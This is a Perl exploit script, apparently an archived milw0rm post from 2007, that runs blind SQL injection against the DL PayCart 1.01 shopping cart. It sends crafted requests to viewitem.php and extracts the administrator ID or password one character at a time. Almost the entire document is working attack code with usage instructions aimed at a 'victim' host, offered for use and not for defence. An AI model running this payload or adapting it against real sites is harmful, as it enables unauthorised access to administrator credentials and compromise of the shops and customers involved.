#!/usr/bin/perl -w
use HTTP::Request;
use LWP::UserAgent;
#---------------------------------------------------------------------------------
# scripts       : DL PayCart 1.01 - (c) 2006
# Discovered By : irvian
# scripts site  : http://www.dinkumsoft.com/
# Thanks To
# bot        : sqlscan, hantu_internet, xcart
# chanell    : #hitamputih #nyubicrew #patihack and my private channel noscan
# Friend     : nyubi, ibnusina, arioo, jipank,ifx and all my friend
#---------------------------------------------------------------------------------
if (@ARGV < 2){
die "
use      : $0 host option
example  : $0 http://victim.com 1

1= AdminID
2= AdminPass\n";}


$url = $ARGV[0];
$option = $ARGV[1];


print "\r\n[+]-----------------------------------------[+]\r\n";
print "[+]Blind SQL injection                [+]\r\n";
print "[+]DL PayCart 1.01 - (c) 2006            [+]\r\n";
print "[+]code by irvian                    [+]\r\n";
print "[+]special To : ifx, arioo, jipank        [+]\r\n";
print "[+]-----------------------------------------[+]\n\r";

if ($option eq 1){
syswrite(STDOUT, "AdminID: ", 9);}
elsif ($option eq 2){
syswrite(STDOUT, "AdminPass: ", 11);}

for($i = 1; $i <= 32; $i++){
 $f = 0;
 $n = 32;
 while(!$f && $n <= 255)
 {
  if(&blind($url, $option, $i, $n,)){
 $f = 1;
     syswrite(STDOUT, chr($n), 1);
   }
$n++;
}
}

print "\n[+]finish Execution Exploit\n";



sub blind {
my $site = $_[0];
my $op = $_[1];
my $az = $_[2];
my $na = $_[3];

if ($op eq 1){$klm = "AdminID";}
elsif ($op eq 2){$klm = "AdminPass";}

$blind = "$site"."/viewitem.php?ItemID=1'/**/and/**/substring((select/**/"."$klm"."/**/from/**/pc_settings/**/limit/**/0,1),"."$az".",1)=char("."$na".")/*";

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$req = $b->request(HTTP::Request->new(GET=>$blind));
$res = $req->content;

if ($res !~ /noimage.gif/i){
    return 1;
}

}

# milw0rm.com [2007-08-28]